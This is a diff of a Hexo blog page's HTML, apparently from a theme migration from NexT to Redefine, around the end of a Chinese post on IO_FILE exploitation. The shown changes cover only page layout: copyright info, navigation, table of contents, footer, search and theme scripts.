system_addr<br></code></pre></td></tr></tbody></table></figure></div>
 
-    </div>
+		</div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/IO-File/" rel="tag"># IO_File</a>
-          </div>
-
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> IO_File的利用</li>
+        <li><strong>作者:</strong> Kylinxin</li>
+        <li><strong>创建于
+                :</strong> 2023-10-15 15:14:29</li>
         
+            <li>
+                <strong>更新于
+                    :</strong> 2023-10-15 15:14:29
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://kylinxin.github.io/2023/10/15/IO_File利用/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2023/10/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/" rel="prev" title="Fuzzing101系列 Exercise 1">
-                  <i class="fa fa-angle-left"></i> Fuzzing101系列 Exercise 1
-                </a>
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/IO-File/">#IO_File</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2023/10/22/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Glibc堆利用之house of 系列</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2023/10/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Fuzzing101系列 Exercise 1</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">IO_File的利用</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E3%80%90PWN%E3%80%91IO-FILE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">【PWN】IO_FILE的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-text">IO_FILE 的结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc"><span class="nav-text">利用_IO_2_1_stdout泄露libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-text">FSOP</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Built with Hexo and Redefine.</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-shield-halved" style="color: #A31F34"></i>&nbsp;&nbsp;<a href="/">Kylinxin</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 60 篇文章
+                    </span>
+                    
+                        <span>
+                            共 132k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
             </div>
-            <div class="post-nav-item">
-                <a href="/2023/10/22/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/" rel="next" title="Glibc堆利用之house of 系列">
-                  Glibc堆利用之house of 系列 <i class="fa fa-angle-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
 </div>
 
 
-
-
-
-
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-  </main>
+	
 
-  <footer class="footer">
-    <div class="footer-inner">
+</main>
 
-  <div class="copyright">
-    &copy; 2023 – 
-    <span itemprop="copyrightYear">2026</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">true</span>
-  </div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">349k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">21:11</span>
-  </span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
 
-    </div>
-  </footer>
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
 
   
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
+<script src="/js/build/libs/Typed.min.js"></script>
 
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
 
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+    
+<script src="/js/build/libs/pangu.min.js"></script>
+
+
+
+	
 </body>
+
 </html>
